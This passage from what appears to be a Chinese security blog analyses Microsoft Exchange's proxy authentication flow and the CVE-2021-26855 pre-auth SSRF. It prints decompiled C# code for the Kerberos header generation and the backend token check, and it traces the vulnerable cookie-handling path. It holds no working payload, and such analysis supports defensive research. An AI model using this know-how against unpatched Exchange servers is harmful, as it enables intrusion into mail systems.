</span></span><span class="line"><span class="cl">    <span class="n">httpWebRequest</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">&#34;X-Forwarded-Port&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">ClientEndpointResolver</span><span class="p">.</span><span class="n">GetClientPort</span><span class="p">(</span><span class="n">SharedHttpContextWrapper</span><span class="p">.</span><span class="n">GetWrapper</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">httpWebRequest</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">&#34;X-MS-EdgeIP&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">Utilities</span><span class="p">.</span><span class="n">GetEdgeServerIpAsProxyHeader</span><span class="p">(</span><span class="n">SharedHttpContextWrapper</span><span class="p">.</span><span class="n">GetWrapper</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">).</span><span class="n">Request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// ...</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">httpWebRequest</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Exchange 还将通过后端的 <code>HTTP Service-Class</code> 生成 Kerberos 票证，并将其放入 Authorization 头中。 此请求头旨在防止匿名用户直接访问后端。使用 Kerberos 票证，后端可以验证来自前端的访问。</p>
<p><strong>HttpProxy\ProxyRequestHandler.cs</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ProxyKerberosAuthentication</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">serverRequest</span><span class="p">.</span><span class="n">ConnectionGroupName</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">ClientRequest</span><span class="p">.</span><span class="n">UserHostAddress</span> <span class="p">+</span> <span class="s">&#34;:&#34;</span> <span class="p">+</span> <span class="n">GccUtils</span><span class="p">.</span><span class="n">GetClientPort</span><span class="p">(</span><span class="n">SharedHttpContextWrapper</span><span class="p">.</span><span class="n">GetWrapper</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">AuthBehavior</span><span class="p">.</span><span class="n">AuthState</span> <span class="p">==</span> <span class="n">AuthState</span><span class="p">.</span><span class="n">BackEndFullAuth</span> <span class="p">||</span> <span class="k">this</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">    <span class="n">ShouldBackendRequestBeAnonymous</span><span class="p">()</span> <span class="p">||</span> <span class="p">(</span><span class="n">HttpProxySettings</span><span class="p">.</span><span class="n">TestBackEndSupportEnabled</span><span class="p">.</span><span class="n">Value</span>  
</span></span><span class="line"><span class="cl">    <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ClientRequest</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">&#34;TestBackEndUrl&#34;</span><span class="p">])))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">serverRequest</span><span class="p">.</span><span class="n">ConnectionGroupName</span> <span class="p">=</span> <span class="s">&#34;Unauthenticated&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">serverRequest</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">&#34;Authorization&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">KerberosUtilities</span><span class="p">.</span><span class="n">GenerateKerberosAuthHeader</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">serverRequest</span><span class="p">.</span><span class="n">Address</span><span class="p">.</span><span class="n">Host</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">TraceContext</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="k">ref</span> <span class="k">this</span><span class="p">.</span><span class="n">authenticationContext</span><span class="p">,</span> <span class="k">ref</span> <span class="k">this</span><span class="p">.</span><span class="n">kerberosChallenge</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>HttpProxy\KerberosUtilities.cs</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">internal</span> <span class="kd">static</span> <span class="kt">string</span> <span class="n">GenerateKerberosAuthHeader</span><span class="p">(</span><span class="kt">string</span> <span class="n">host</span><span class="p">,</span> <span class="kt">int</span> <span class="n">traceContext</span><span class="p">,</span> <span class="k">ref</span> <span class="n">AuthenticationContext</span> <span class="n">authenticationContext</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">string</span> <span class="n">kerberosChallenge</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...</span>
</span></span><span class="line"><span class="cl">    <span class="n">authenticationContext</span> <span class="p">=</span> <span class="k">new</span> <span class="n">AuthenticationContext</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="s">&#34;HTTP/&#34;</span> <span class="p">+</span> <span class="n">host</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">authenticationContext</span><span class="p">.</span><span class="n">InitializeForOutboundNegotiate</span><span class="p">(</span><span class="n">AuthenticationMechanism</span><span class="p">.</span><span class="n">Kerberos</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">SecurityStatus</span> <span class="n">securityStatus</span> <span class="p">=</span> <span class="n">authenticationContext</span><span class="p">.</span><span class="n">NegotiateSecurityContext</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">,</span> <span class="k">out</span> <span class="n">bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">@string</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s">&#34;Negotiate &#34;</span> <span class="p">+</span> <span class="n">@string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因此，代理到后端的客户端请求将添加多个 HTTP 标头供后端使用。 两个最重要的 Headers 是 <code>X-CommonAccessToken</code>，表示邮件用户的登录身份，以及 <code>Kerberos Ticket</code>，表示来自前端的合法访问。</p>
<ul>
<li>Frontend Response Section</li>
</ul>
<p>Response Section 接收来自后端的响应并决定允许哪些请求头或 cookie 发送回给前端。</p>
<h5 id="5313-backend-rehydration-module">5.3.1.3 Backend Rehydration Module</h5>
<p>Backend 首先使用 <code>IsAuthenticated</code> 方法来检查传入的请求是否经过身份验证。然后后端会验证该请求是否存在一个名为 <code>ms-Exch-EPI-Token-Serialization</code> 的扩展权限。在默认设置下，只有 Exchange 机器帐户才具有此权限。这也是 Frontend 生成的 Kerberos Ticket 可以通过检测，但是低授权账号不能直接访问 Backend 的原因。</p>
<p>校验通过后，Exchange 将 HTTP 头中的 <code>X-CommonAccessToken</code> 反序列化回原始 <code>Access Token</code>，还原用户身份，然后将其放入 <code>httpContext</code> 对象中进行到 Backend 中的业务逻辑。</p>
<p><strong>Authentication\BackendRehydrationModule.cs</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">private</span> <span class="k">void</span> <span class="n">OnAuthenticateRequest</span><span class="p">(</span><span class="kt">object</span> <span class="n">source</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">httpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">IsAuthenticated</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="n">ProcessRequest</span><span class="p">(</span><span class="n">httpContext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="k">void</span> <span class="n">ProcessRequest</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">httpContext</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">CommonAccessToken</span> <span class="n">token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">TryGetCommonAccessToken</span><span class="p">(</span><span class="n">httpContext</span><span class="p">,</span> <span class="k">out</span> <span class="n">token</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">bool</span> <span class="n">TryGetCommonAccessToken</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">httpContext</span><span class="p">,</span> <span class="k">out</span> <span class="n">CommonAccessToken</span> <span class="n">token</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">httpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">&#34;X-CommonAccessToken&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">text</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">IsTokenSerializationAllowed</span><span class="p">(</span><span class="n">httpContext</span><span class="p">.</span><span class="n">User</span><span class="p">.</span><span class="n">Identity</span> <span class="k">as</span> <span class="n">WindowsIdentity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">httpContext</span><span class="p">.</span><span class="n">Items</span><span class="p">[</span><span class="s">&#34;BEValidateCATRightsLatency&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">stopwatch</span><span class="p">.</span><span class="n">ElapsedMilliseconds</span> <span class="p">-</span> <span class="n">elapsedMilliseconds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="p">=</span> <span class="n">CommonAccessToken</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">httpContext</span><span class="p">.</span><span class="n">Items</span><span class="p">[</span><span class="s">&#34;Item-CommonAccessToken&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">//...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">bool</span> <span class="n">IsTokenSerializationAllowed</span><span class="p">(</span><span class="n">WindowsIdentity</span> <span class="n">windowsIdentity</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="n">flag2</span> <span class="p">=</span> <span class="n">LocalServer</span><span class="p">.</span><span class="n">AllowsTokenSerializationBy</span><span class="p">(</span><span class="n">clientSecurityContext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">flag2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="kd">static</span> <span class="kt">bool</span> <span class="n">AllowsTokenSerializationBy</span><span class="p">(</span><span class="n">ClientSecurityContext</span> <span class="n">clientContext</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">LocalServer</span><span class="p">.</span><span class="n">HasExtendedRightOnServer</span><span class="p">(</span><span class="n">clientContext</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">WellKnownGuid</span><span class="p">.</span><span class="n">TokenSerializationRightGuid</span><span class="p">);</span>  <span class="c1">// ms-Exch-EPI-Token-Serialization</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="532-受影响的版本">5.3.2 受影响的版本</h4>
<ul>
<li>Exchange Server 2013 &lt; Mar21SU</li>
<li>Exchange Server 2016 &lt; Mar21SU &lt; CU20</li>
<li>Exchange Server 2019 &lt; Mar21SU &lt; CU9</li>
</ul>
<h4 id="533-漏洞复现">5.3.3 漏洞复现</h4>
<h5 id="5331-cve-2021-26855---pre-auth-ssrf">5.3.3.1 CVE-2021-26855 - Pre-auth SSRF</h5>
<p>Frontend 有 20 多个对应不同应用路径的 handler。<code>GetTargetBackEndServerUrl</code> 方法负责在静态资源处理程序中计算后端 URL。因此，该漏洞的成因为：<code>Microsoft.Exchange.FrontEndHttpProxy</code> 未有效校验 Cookie 中用户可控的 <code>X-BEResource</code> 值，后续处理中结合 .NET 的 <code>UriBuilder </code>类特性造成 SSRF。</p>
<p>定位到 <code>Microsoft.Exchange.FrontEndHttpProxy</code> 相关的代码变动：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172020786.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172020786.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172020786.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172020786.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172020786.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172020786.png-water_print" /></p>
<p><code>ProxyRequestHandler </code>类是 CAS 反代过程中，负责处理用户请求与后端响应的一个的组件。因为函数调用关系比较复杂，先从整体上列出从收到用户请求开始几个主线的方法调用栈。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// Microsoft.Exchange.FrontEndHttpProxy
</span></span><span class="line"><span class="cl">public class ProxyModule : IHttpModule
</span></span><span class="line"><span class="cl">    public void Init(HttpApplication application)
</span></span><span class="line"><span class="cl">        private void OnPostAuthorizeRequest(object sender, EventArgs e)
</span></span><span class="line"><span class="cl">            protected virtual void OnPostAuthorizeInternal(HttpApplication httpApplication)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                private IHttpHandler SelectHandlerForUnauthenticatedRequest(HttpContext httpContext)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                HttpContext context = httpApplication.Context;
</span></span><span class="line"><span class="cl">                context.RemapHandler(httpHandler);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172021157.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172021157.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172021157.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172021157.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172021157.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172021157.png-water_print" /></p>
<p>当请求路径为 <code>/ecp/</code> 时，会通过 <code>IsResourceRequest</code> 方法判断文件后缀名：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// Microsoft.Exchange.FrontEndHttpProxy
</span></span><span class="line"><span class="cl">internal class BEResourceRequestHandler : ProxyRequestHandler
</span></span><span class="line"><span class="cl">    internal static bool CanHandle(HttpRequest httpRequest)
</span></span><span class="line"><span class="cl">        private static string GetBEResouceCookie(HttpRequest httpRequest)
</span></span><span class="line"><span class="cl">        internal static bool IsResourceRequest(string localPath)
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024038.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024038.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024038.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024038.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024038.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024038.png-water_print" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024161.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024161.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024161.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024161.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024161.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172024161.png-water_print" /></p>
<p>通过判断后由 <code>BeginProcessRequest</code> 方法继续处理后续流程：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">IAsyncResult</span> <span class="n">BeginProcessRequest</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">AsyncCallback</span> <span class="n">cb</span><span class="p">,</span> <span class="kt">object</span> <span class="n">extraData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="k">void</span> <span class="n">InternalBeginCalculateTargetBackEnd</span><span class="p">(</span><span class="k">out</span> <span class="n">AnchorMailbox</span> <span class="n">anchorMailbox</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">protected</span> <span class="kd">override</span> <span class="n">AnchorMailbox</span> <span class="n">ResolveAnchorMailbox</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">ServerInfoAnchorMailbox</span><span class="p">(</span><span class="n">BackEndServer</span> <span class="n">backendServer</span><span class="p">,</span> <span class="n">IRequestContext</span> <span class="n">requestContext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="kd">public</span> <span class="kd">static</span> <span class="n">BackEndServer</span> <span class="n">FromString</span><span class="p">(</span><span class="kt">string</span> <span class="n">input</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="k">void</span> <span class="n">OnCalculateTargetBackEndCompleted</span><span class="p">(</span><span class="kt">object</span> <span class="n">extraData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="kd">private</span> <span class="k">void</span> <span class="n">InternalOnCalculateTargetBackEndCompleted</span><span class="p">(</span><span class="n">TargetCalculationCallbackBeacon</span> <span class="n">beacon</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="kd">private</span> <span class="k">void</span> <span class="n">BeginValidateBackendServerCacheOrProxyOrRecalculate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="kd">protected</span> <span class="k">void</span> <span class="n">BeginProxyRequestOrRecalculate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                        <span class="kd">protected</span> <span class="k">void</span> <span class="n">BeginProxyRequest</span><span class="p">(</span><span class="kt">object</span> <span class="n">extraData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                            <span class="kd">protected</span> <span class="k">virtual</span> <span class="n">Uri</span> <span class="n">GetTargetBackEndServerUrl</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                            <span class="kd">protected</span> <span class="n">HttpWebRequest</span> <span class="n">CreateServerRequest</span><span class="p">(</span><span class="n">Uri</span> <span class="n">targetUrl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                <span class="kd">protected</span> <span class="k">void</span> <span class="n">PrepareServerRequest</span><span class="p">(</span><span class="n">HttpWebRequest</span> <span class="n">serverRequest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                        <span class="kd">internal</span> <span class="kd">static</span> <span class="kt">string</span> <span class="n">KerberosUtilities</span><span class="p">.</span><span class="n">GenerateKerberosAuthHeader</span><span class="p">(...)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                		<span class="kd">private</span> <span class="k">void</span> <span class="n">CopyHeadersToServerRequest</span><span class="p">(</span><span class="n">HttpWebRequest</span> <span class="n">destination</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                            <span class="kd">protected</span> <span class="k">virtual</span> <span class="kt">bool</span> <span class="n">ShouldCopyHeaderToServerRequest</span><span class="p">(</span><span class="kt">string</span> <span class="n">headerName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                            			<span class="kd">private</span> <span class="k">void</span> <span class="n">CopyCookiesToServerRequest</span><span class="p">(</span><span class="n">HttpWebRequest</span> <span class="n">serverRequest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                            			<span class="kd">protected</span> <span class="k">virtual</span> <span class="k">void</span> <span class="n">SetProtocolSpecificServerRequestParameters</span><span class="p">(</span><span class="n">HttpWebRequest</span> <span class="n">serverRequest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            			<span class="kd">protected</span> <span class="k">virtual</span> <span class="k">void</span> <span class="n">AddProtocolSpecificHeadersToServerRequest</span><span class="p">(</span><span class="n">WebHeaderCollection</span> <span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                            <span class="kd">private</span> <span class="k">void</span> <span class="n">BeginGetServerResponse</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                                <span class="kd">private</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">ResponseReadyCallback</span><span class="p">(</span><span class="n">IAsyncResult</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                    <span class="kd">private</span> <span class="k">void</span> <span class="n">OnResponseReady</span><span class="p">(</span><span class="kt">object</span> <span class="n">extraData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                        <span class="kd">private</span> <span class="k">void</span> <span class="n">ProcessResponse</span><span class="p">(</span><span class="n">WebException</span> <span class="n">exception</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                            <span class="kd">private</span> <span class="k">void</span> <span class="n">CopyHeadersToClientResponse</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                                            <span class="kd">private</span> <span class="k">void</span> <span class="n">CopyCookiesToClientResponse</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>ResolveAnchorMailbox</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
